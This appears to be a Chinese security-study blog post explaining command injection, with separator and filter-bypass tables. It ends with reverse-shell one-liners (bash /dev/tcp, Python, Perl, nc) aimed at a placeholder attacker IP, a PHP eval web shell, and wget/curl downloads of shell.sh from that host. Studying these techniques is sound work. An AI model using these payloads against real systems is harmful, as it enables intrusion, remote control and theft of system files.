@@ -1,0 +1,1315 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/dog.png">
+  <link rel="icon" href="/img/dog.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Seth">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="命令注入漏洞一、定义应用程序在调用系统命令时，未对用户输入进行严格验证，导致攻击者可以通过操纵输入参数来执行任意系统命令。 该漏洞主要出现在需要与操作系统交互的应用程序中，如文件处理、网络操作、系统管理等功能模块。 二、产生原因应用程序将用户输入直接拼接到系统命令中，而没有进行必要的验证或转义，使得攻击者可以通过注入命令分隔符、重定向、管道等特殊字符，修改原始命令，执行额外的恶意命令。 常见场景：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令注入漏洞知识总结">
+<meta property="og:url" content="https://blessing-heavenly.github.io/2026/09/11/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="学习经历分享">
+<meta property="og:description" content="命令注入漏洞一、定义应用程序在调用系统命令时，未对用户输入进行严格验证，导致攻击者可以通过操纵输入参数来执行任意系统命令。 该漏洞主要出现在需要与操作系统交互的应用程序中，如文件处理、网络操作、系统管理等功能模块。 二、产生原因应用程序将用户输入直接拼接到系统命令中，而没有进行必要的验证或转义，使得攻击者可以通过注入命令分隔符、重定向、管道等特殊字符，修改原始命令，执行额外的恶意命令。 常见场景：">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-11T10:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-11T12:28:38.738Z">
+<meta property="article:author" content="Seth">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>命令注入漏洞知识总结 - 学习经历分享</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blessing-heavenly.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Seth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner-post.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令注入漏洞知识总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-11 18:00" pubdate>
+          2026年9月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令注入漏洞知识总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>应用程序在调用系统命令时，未对用户输入进行严格验证，导致攻击者可以通过操纵输入参数来执行任意系统命令。</p>
+<p>该漏洞主要出现在需要与操作系统交互的应用程序中，如文件处理、网络操作、系统管理等功能模块。</p>
+<h2 id="二、产生原因"><a href="#二、产生原因" class="headerlink" title="二、产生原因"></a>二、产生原因</h2><p>应用程序将用户输入直接拼接到系统命令中，而没有进行必要的验证或转义，使得攻击者可以通过注入命令分隔符、重定向、管道等特殊字符，修改原始命令，执行额外的恶意命令。</p>
+<p>常见场景：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span> . <span class="hljs-variable">$ip</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>正常请求：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=127.0.0.1<br></code></pre></td></tr></table></figure>
+
+<p>恶意请求：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=127.0.0.1; whoami<br></code></pre></td></tr></table></figure>
+
+<h2 id="三、命令注入的分类"><a href="#三、命令注入的分类" class="headerlink" title="三、命令注入的分类"></a>三、命令注入的分类</h2><table>
+<thead>
+<tr>
+<th>分类</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>直接命令注入</strong></td>
+<td>用户输入直接拼接到系统命令中执行</td>
+</tr>
+<tr>
+<td><strong>间接命令注入</strong></td>
+<td>用户通过环境变量、配置文件等间接影响系统命令执行</td>
+</tr>
+<tr>
+<td><strong>盲命令注入</strong></td>
+<td>命令执行结果不直接返回给用户，需通过侧信道判断</td>
+</tr>
+<tr>
+<td><strong>参数注入</strong></td>
+<td>注入命令参数而不是整个命令</td>
+</tr>
+</tbody></table>
+<h3 id="盲命令注入的常见判断方式"><a href="#盲命令注入的常见判断方式" class="headerlink" title="盲命令注入的常见判断方式"></a>盲命令注入的常见判断方式</h3><table>
+<thead>
+<tr>
+<th>方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>时间延迟</td>
+<td><code>; sleep 5</code>，通过响应时间判断</td>
+</tr>
+<tr>
+<td>DNS 请求</td>
+<td><code>; nslookup xxx.dnslog.cn</code>，通过 DNS 日志判断</td>
+</tr>
+<tr>
+<td>HTTP 请求</td>
+<td><code>; curl http://xxx.dnslog.cn</code>，通过 HTTP 日志判断</td>
+</tr>
+<tr>
+<td>文件写入</td>
+<td><code>; echo test &gt; /tmp/test</code>，通过后续访问判断</td>
+</tr>
+<tr>
+<td>报错回显</td>
+<td><code>; ls /nonexistent</code>，通过错误信息判断</td>
+</tr>
+</tbody></table>
+<h2 id="四、常用命令分隔符"><a href="#四、常用命令分隔符" class="headerlink" title="四、常用命令分隔符"></a>四、常用命令分隔符</h2><table>
+<thead>
+<tr>
+<th>分隔符</th>
+<th>作用</th>
+<th>适用系统</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>命令序列分隔符，顺序执行多条指令</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ls; whoami</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>后台执行命令，不等待前一命令完成</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ping 127.0.0.1 &amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>仅当前命令成功执行时执行下一条指令</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ls /tmp &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>管道符，将前一命令的输出作为后一命令的输入</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>cat /etc/passwd | grep root</code></td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td>仅当前一命令失败执行时执行下一命令</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ls /nonexistent || whoami</code></td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td>命令替换，执行括号内的命令并替换为执行结果</td>
+<td>所有类 Unix 系统</td>
+<td><code>echo $(whoami)</code></td>
+</tr>
+<tr>
+<td><code>` `</code></td>
+<td>命令替换（反引号），执行反引号内的命令并替换为执行结果</td>
+<td>所有类 Unix 系统</td>
+<td><code>echo `whoami` </code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>输出重定向，将命令输出写入文件</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>whoami &gt; user.txt</code></td>
+</tr>
+<tr>
+<td><code>&gt;&gt;</code></td>
+<td>追加输出重定向，将命令输出追加到文件</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>whoami &gt;&gt; user.txt</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code></td>
+<td>输入重定向，将文件内容作为命令输入</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>cat &lt; input.txt</code></td>
+</tr>
+<tr>
+<td><code>%0A</code></td>
+<td>URL 编码的换行符，在某些环境中可作为命令分隔符</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ls%0Awhoami</code></td>
+</tr>
+<tr>
+<td><code>%0D</code></td>
+<td>URL 编码的回车符</td>
+<td>所有类 Unix 系统、Windows</td>
+<td><code>ls%0Dwhoami</code></td>
+</tr>
+</tbody></table>
+<h3 id="Windows-特有分隔符"><a href="#Windows-特有分隔符" class="headerlink" title="Windows 特有分隔符"></a>Windows 特有分隔符</h3><table>
+<thead>
+<tr>
+<th>分隔符</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>|</code></td>
+<td>管道符</td>
+<td><code>dir | findstr &quot;flag&quot;</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>顺序执行</td>
+<td><code>dir &amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>成功后执行</td>
+<td><code>dir &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td>失败后执行</td>
+<td><code>dir || whoami</code></td>
+</tr>
+</tbody></table>
+<h2 id="五、环境变量与命令执行"><a href="#五、环境变量与命令执行" class="headerlink" title="五、环境变量与命令执行"></a>五、环境变量与命令执行</h2><p>环境变量可以被用于命令注入攻击，攻击者可以通过修改或设置特定的环境变量来影响命令执行：</p>
+<ol>
+<li><strong>PATH 环境变量</strong>：攻击者可以修改 PATH 环境变量，使系统优先执行恶意程序</li>
+<li><strong>LD_PRELOAD 环境变量</strong>：在 Linux 系统中，攻击者可以设置此变量加载恶意共享库</li>
+<li><strong>其他环境变量</strong>：特定程序可能依赖某些环境变量，攻击者可以利用这些变量进行攻击</li>
+</ol>
+<h3 id="常见可利用的环境变量"><a href="#常见可利用的环境变量" class="headerlink" title="常见可利用的环境变量"></a>常见可利用的环境变量</h3><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$PATH</code></td>
+<td>命令搜索路径，可劫持命令执行</td>
+</tr>
+<tr>
+<td><code>$HOME</code></td>
+<td>用户主目录</td>
+</tr>
+<tr>
+<td><code>$USER</code></td>
+<td>当前用户名</td>
+</tr>
+<tr>
+<td><code>$SHELL</code></td>
+<td>当前 Shell</td>
+</tr>
+<tr>
+<td><code>$IFS</code></td>
+<td>内部字段分隔符，默认包含空格、制表符、换行符</td>
+</tr>
+<tr>
+<td><code>$LD_PRELOAD</code></td>
+<td>预加载共享库（Linux）</td>
+</tr>
+<tr>
+<td><code>$BASH_ENV</code></td>
+<td>Bash 启动时执行的文件</td>
+</tr>
+</tbody></table>
+<h2 id="六、绕过过滤"><a href="#六、绕过过滤" class="headerlink" title="六、绕过过滤"></a>六、绕过过滤</h2><p>当应用程序对用户输入进行了某些过滤时，攻击者可以使用以下技术绕过过滤。</p>
+<h3 id="1-常见绕过技巧"><a href="#1-常见绕过技巧" class="headerlink" title="1. 常见绕过技巧"></a>1. 常见绕过技巧</h3><table>
+<thead>
+<tr>
+<th>技术</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>大小写混合</strong></td>
+<td>绕过区分大小写的过滤</td>
+<td><code>WhOaMi</code> 代替 <code>whoami</code></td>
+</tr>
+<tr>
+<td><strong>编码绕过</strong></td>
+<td>使用 URL 编码、双重 URL 编码等</td>
+<td><code>%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64</code> 代替 <code>cat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><strong>空字节绕过</strong></td>
+<td>使用 null 字节（<code>%00</code>）截断字符串</td>
+<td><code>cat /etc/passwd%00.jpg</code></td>
+</tr>
+<tr>
+<td><strong>特殊字符替换</strong></td>
+<td>使用功能相似的命令或参数替换被过滤的字符</td>
+<td><code>$@</code> 代替空格，<code>cat&lt;/etc/passwd</code> 代替 <code>cat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><strong>命令分隔符替换</strong></td>
+<td>使用多种命令分隔符绕过过滤</td>
+<td>使用 <code>&amp;</code> 代替 <code>;</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-空格过滤绕过"><a href="#2-空格过滤绕过" class="headerlink" title="2. 空格过滤绕过"></a>2. 空格过滤绕过</h3><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>${IFS}</code></td>
+<td><code>cat${IFS}/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>$IFS$9</code></td>
+<td><code>cat$IFS$9/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>&lt;</code> 重定向</td>
+<td><code>cat&lt;/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>&lt;&gt;</code></td>
+<td><code>cat&lt;&gt;/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>%09</code>（Tab）</td>
+<td><code>cat%09/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>%0a</code>（换行）</td>
+<td><code>cat%0a/etc/passwd</code></td>
+</tr>
+<tr>
+<td>大括号</td>
+<td><code>{cat,/etc/passwd}</code></td>
+</tr>
+<tr>
+<td>变量拼接</td>
+<td><code>a=/etc/passwd;cat$a</code></td>
+</tr>
+</tbody></table>
+<h3 id="3-关键字过滤绕过"><a href="#3-关键字过滤绕过" class="headerlink" title="3. 关键字过滤绕过"></a>3. 关键字过滤绕过</h3><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>反斜杠转义</td>
+<td><code>c\at /etc/passwd</code></td>
+</tr>
+<tr>
+<td>大小写混合</td>
+<td><code>WhOaMi</code></td>
+</tr>
+<tr>
+<td>引号</td>
+<td><code>c&quot;a&quot;t /etc/passwd</code>、<code>c&#39;a&#39;t /etc/passwd</code></td>
+</tr>
+<tr>
+<td>变量拼接</td>
+<td><code>a=ca;b=t;$a$b /etc/passwd</code></td>
+</tr>
+<tr>
+<td>通配符</td>
+<td><code>/???/??t /etc/passwd</code>、<code>/etc/pass*</code></td>
+</tr>
+<tr>
+<td>编码</td>
+<td><code>echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-命令分隔符过滤绕过"><a href="#4-命令分隔符过滤绕过" class="headerlink" title="4. 命令分隔符过滤绕过"></a>4. 命令分隔符过滤绕过</h3><table>
+<thead>
+<tr>
+<th>过滤字符</th>
+<th>绕过方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>使用 <code>&amp;</code>、<code>&amp;&amp;</code>、<code>|</code>、<code>||</code>、<code>%0a</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>使用 <code>;</code>、<code>|</code>、<code>%0a</code></td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>使用 <code>;</code>、<code>&amp;</code>、<code>%0a</code></td>
+</tr>
+<tr>
+<td><code>$()</code></td>
+<td>使用反引号 <code>`</code></td>
+</tr>
+<tr>
+<td>反引号</td>
+<td>使用 <code>$()</code></td>
+</tr>
+</tbody></table>
+<h3 id="5-引号过滤绕过"><a href="#5-引号过滤绕过" class="headerlink" title="5. 引号过滤绕过"></a>5. 引号过滤绕过</h3><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>无引号技术</td>
+<td><code>cat$HOME/.bashrc</code></td>
+</tr>
+<tr>
+<td>变量拼接</td>
+<td><code>a=pass;cat /etc/$awd</code></td>
+</tr>
+<tr>
+<td>十六进制</td>
+<td><code>echo -e &quot;\x63\x61\x74&quot;</code></td>
+</tr>
+</tbody></table>
+<h3 id="6-函数过滤绕过"><a href="#6-函数过滤绕过" class="headerlink" title="6. 函数过滤绕过"></a>6. 函数过滤绕过</h3><table>
+<thead>
+<tr>
+<th>原函数</th>
+<th>替代函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>system()</code></td>
+<td><code>passthru()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>popen()</code>、<code>proc_open()</code>、反引号</td>
+</tr>
+<tr>
+<td><code>passthru()</code></td>
+<td><code>system()</code>、<code>exec()</code></td>
+</tr>
+<tr>
+<td><code>exec()</code></td>
+<td><code>system()</code>、<code>shell_exec()</code></td>
+</tr>
+</tbody></table>
+<h2 id="七、关于-IFS-的说明"><a href="#七、关于-IFS-的说明" class="headerlink" title="七、关于 IFS 的说明"></a>七、关于 IFS 的说明</h2><blockquote>
+<p><strong>IFS 为什么能绕过？</strong></p>
+<p>IFS 是 shell 的环境变量，默认包含空格、制表符和换行符。shell 在解析命令行时，会使用 IFS 来分割单词。</p>
+<p>而 <code>$IFS</code> 在变量展开时会被替换成它的实际值，即一个空格（或其他空白字符）。</p>
+</blockquote>
+<p>假设在命令行中输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>&quot;1&quot;</code> 可以替换成其他东西，比如 <code>/etc/passwd</code></p>
+</blockquote>
+<p>shell 会先进行变量替换：</p>
+<ul>
+<li><code>$IFS</code> 会被替换成一个空格</li>
+<li><code>$1</code> 是第一个位置参数，没有设置就是一个单纯的空变量<ul>
+<li><code>&quot; $未知 &quot;</code> 的意思是变量名为 <code>&quot; 未知 &quot;</code> 的变量</li>
+</ul>
+</li>
+</ul>
+<p>实际执行命令就会是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1<br></code></pre></td></tr></table></figure>
+
+<p>如果是 <code>cat$IFS/etc/passwd</code>，就是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure>
+
+<h2 id="八、常见利用技巧"><a href="#八、常见利用技巧" class="headerlink" title="八、常见利用技巧"></a>八、常见利用技巧</h2><h3 id="1-反弹-Shell"><a href="#1-反弹-Shell" class="headerlink" title="1. 反弹 Shell"></a>1. 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Bash</span><br>bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 0&gt;&amp;1<br><br><span class="hljs-comment"># Python</span><br>python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击者IP&quot;,端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span><br><br><span class="hljs-comment"># Perl</span><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;攻击者IP&quot;;$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br><span class="hljs-comment"># Netcat</span><br>nc -e /bin/sh 攻击者IP 端口<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-写入-WebShell"><a href="#2-写入-WebShell" class="headerlink" title="2. 写入 WebShell"></a>2. 写入 WebShell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; /var/www/html/shell.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-下载文件"><a href="#3-下载文件" class="headerlink" title="3. 下载文件"></a>3. 下载文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://攻击者IP/shell.sh -O /tmp/shell.sh<br>curl http://攻击者IP/shell.sh -o /tmp/shell.sh<br></code></pre></td></tr></table></figure>
+
